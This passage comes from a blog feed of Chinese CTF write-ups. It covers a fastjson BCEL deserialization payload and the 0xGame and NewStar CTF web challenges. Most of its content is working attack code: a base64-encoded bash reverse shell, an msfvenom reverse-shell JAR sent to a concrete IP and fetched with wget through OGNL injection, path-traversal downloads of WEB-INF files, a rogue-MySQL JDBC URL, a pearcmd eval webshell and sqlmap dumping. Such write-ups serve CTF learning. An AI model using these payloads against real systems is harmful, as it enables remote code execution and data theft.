class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>);</span><br><span class="line">        ParserConfig.getGlobalInstance().addAccept(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\&quot;driverClassLoader\&quot;:&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;,\&quot;driverClassName\&quot;:\&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A\&quot;&#125;,&#123;\&quot;$ref\&quot;: \&quot;$[0].Connection\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span><span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="punctuation">&#123;</span><span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[0].Connection&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœ</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322132610173.png" alt="image-20240322132610173"></p><p><strong>è¿‡ç¨‹åˆ†æ</strong></p><p><a href="https://blog.csdn.net/solitudi/article/details/120275526">https://blog.csdn.net/solitudi/article/details/120275526</a></p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="java" scheme="https://bowuchuling.github.io/categories/java/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/java/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="java" scheme="https://bowuchuling.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>0xGame WEEK4 javaå…¨å®¶æ¡¶</title>
    <link href="https://bowuchuling.github.io/posts/654uyiuw0.html"/>
    <id>https://bowuchuling.github.io/posts/654uyiuw0.html</id>
    <published>2023-10-26T07:56:22.585Z</published>
    <updated>2024-04-04T18:18:25.729Z</updated>
    
    <content type="html"><![CDATA[<h1>0xGame WEEK4 javaå…¨å®¶æ¡¶</h1><h2 id="Week-4-spring">[Week 4] spring</h2><p>æ ¹æ®æç¤ºä¸ºspringbootçš„actuatoræœªæˆæƒè®¿é—®æ¼æ´ï¼Œä¸‹è½½æ•æ„Ÿæ–‡ä»¶heapdump</p><p>ctfscript</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">java </span>-<span class="keyword">jar </span><span class="keyword">JDumpSpider-1.1-SNAPSHOT-full.jar </span>heapdump</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231025213944755.png" alt="image-20231025213944755"></p><h2 id="Week-4-auth-bypass">[Week 4] auth_bypass</h2><p>ç»•è¿‡å§¿åŠ¿ï¼š</p><p>hackbarï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span></span><br></pre></td></tr></table></figure><p>burpsuiteï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/./</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½äº†ï¼Œé¦–å…ˆå°è¯•ä¸‹è½½æ•æ„Ÿæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.IndexServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.example.demo.EvilServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EvilServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/You_Find_This_Evil_Servlet_a76f02cb8422<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.example.demo.AuthFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ–°çš„è·¯ç”±ï¼Œç›´æ¥è®¿é—®å¾—åˆ°ä¿¡æ¯æœ‰é™ï¼Œæ ¹æ®å¾—åˆ°çš„é…ç½®æ–‡ä»¶å°è¯•æºä»£ç çš„classæ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/WEB-INF/</span>web.xm1  <span class="comment">#WEBåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶å®ƒåº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>classes/  <span class="comment">#å«ç«™ç‚¹æ‰€æœ‰çš„classæ–‡ä»¶</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>lib/   <span class="comment">#å­˜æ”¾WEBåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶</span></span><br><span class="line"><span class="regexp">/WEB-INF/</span>src/  <span class="comment">#æºç ç›®å½•</span></span><br><span class="line">WEB-INF/database.properties   <span class="comment">#æ•°æ®åº“é…èƒƒæ–‡ä»¶</span></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="regexp">//</span>download?filename=..<span class="regexp">/WEB-INF/</span>classes<span class="regexp">/com/</span>example<span class="regexp">/demo/</span>EvilServlet.class</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºä»£ç ä¹‹åè¿›è¡Œåç¼–è¯‘å¾—åˆ°è·¯ç”±å’Œæ‰§è¡Œå‚æ•°</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You_Fi<span class="symbol">nd_This_Evil_Servlet_a76</span>f<span class="number">02</span>cb<span class="number">8422</span>?Evil_Cmd_Argume<span class="symbol">nts_fe37627</span>fed<span class="number">78</span>=ls</span><br></pre></td></tr></table></figure><p>åå¼¹shellè¿›è¡Œrceï¼Œå‘½ä»¤å’Œå¹³å¸¸çš„ä¸å¤ªä¸€æ ·</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">bash -c </span><span class="template-variable">&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjE=&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;base64,-d&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;bash,-i&#125;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231025221533100.png" alt="image-20231025221533100"></p><h2 id="Week-4-YourBatis">[Week 4] YourBatis</h2><p>åŠ¨æ€SQLä¼šé€ æˆOGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæµ‹è¯•paylaodå¦‚ä¸‹ï¼Œä¼ å…¥çš„æ—¶å€™ä¸€å®šå¾—urlç¼–ç </p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@java</span>.lang.Runtime<span class="variable">@getRuntime</span>().<span class="built_in">exec</span>(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½¿ç”¨msfå¾—åˆ°shellï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤ç”Ÿæˆæœ¨é©¬æ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp <span class="attribute">LHOST</span>=150.158.24.228 <span class="attribute">LPORT</span>=250 -f jar &gt; shell.jar</span><br></pre></td></tr></table></figure><p>å°†æœ¨é©¬ä¸‹è½½åˆ°é¶æœºä¸Š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;wget http://url/shell.jar -O 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>åœ¨vpsä¸Šå¼€å¯msfç›‘å¬</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD java/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 150.158.24.228</span><br><span class="line"><span class="built_in">set</span> LPORT 250</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>åœ¨é¶æœºä¸Šæ‰§è¡Œç›®æ ‡æœ¨é©¬ï¼Œè®°å¾—urlç¼–ç </p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;</span><span class="variable">@java</span>.lang.<span class="title class_">Runtime</span><span class="variable">@getRuntime</span>().exec(<span class="string">&quot;java -jar 2.jar&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>envå¾—åˆ°flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231026152548555.png" alt="image-20231026152548555"></p><h2 id="Week-4-TestConnection">[Week 4] TestConnection</h2><p>çœ‹äº†hintçŸ¥é“äº†æ˜¯jdbcçš„æ•°æ®åº“è¿æ¥æ¼æ´</p><p>åˆ©ç”¨é¡¹ç›®ï¼š<a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>vpså¯åŠ¨æœåŠ¡ï¼Œç›´æ¥è¯»å–ç¯å¢ƒå˜é‡å°±okï¼Œé¶æœºå‘½ä»¤å¦‚ä¸‹</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testConnection?<span class="attr">username</span><span class="operator">=</span><span class="variable">&amp;password</span>=<span class="variable">&amp;driver</span>=com.mysql.jdbc.Driver<span class="variable">&amp;url</span>=jdbc:mysql:<span class="comment">//110.41.17.183:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231026155354422.png" alt="image-20231026155354422"></p>]]></content>
    
    
    <summary type="html">0xGame gogogo</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/CTF/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>NewStar CTF WEEK 3</title>
    <link href="https://bowuchuling.github.io/posts/fcr7dhw7.html"/>
    <id>https://bowuchuling.github.io/posts/fcr7dhw7.html</id>
    <published>2023-10-17T02:57:26.640Z</published>
    <updated>2023-10-17T03:01:02.405Z</updated>
    
    <content type="html"><![CDATA[<h1>NewStar CTF WEEK3</h1><h2 id="Include-ğŸ">Include ğŸ</h2><p>pearcmdæ–‡ä»¶åŒ…å«ï¼Œç”¨bpå‘åŒ…é˜²æ­¢payloadè¢«ç¼–ç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+<span class="regexp">/&amp;file=/</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>lib<span class="regexp">/php/</span>pearcmd&amp;<span class="regexp">/&lt;?=eval($_POST[1]);?&gt;+/</span>tmp/chuling2.php</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆexp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">?<span class="attribute">file</span>=/tmp/chuling2</span><br><span class="line">POST:</span><br><span class="line"><span class="attribute">1</span>=phpinfo();</span><br></pre></td></tr></table></figure><p>åé¢å°±æ˜¯å‘½ä»¤æ‰§è¡Œäº†</p><h2 id="medium-sql">medium_sql</h2><p>sqlmapä¸€æŠŠæ¢­ï¼Œæ—¶é—´ç›²æ³¨</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u url/?<span class="built_in">id</span>= -p <span class="built_in">id</span> -D ctf -T here_is_flag -C flag <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure><h2 id="POP-Gadget">POP Gadget</h2><p>ç®€å•çš„popé“¾</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE_<span class="number">_</span>);</span><br><span class="line"></span><br><span class="line">class Begin&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this-</span><span class="built_in">&gt;name</span>))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Then&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)();  //<span class="variable">$this-</span>&gt;func=new ç±»å();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$vars</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;call&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;<span class="keyword">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Super&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()  //  å­—æ¯æ•°å­—()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CTF&#123;</span><br><span class="line">    public <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;end&quot;</span>;</span><br><span class="line">        unset(<span class="variable">$this-</span>&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unset(<span class="variable">$var</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)(<span class="variable">$this-</span>&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Begin();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Then();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func = new Super();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj = new Handle();</span><br><span class="line"><span class="variable">$a-</span><span 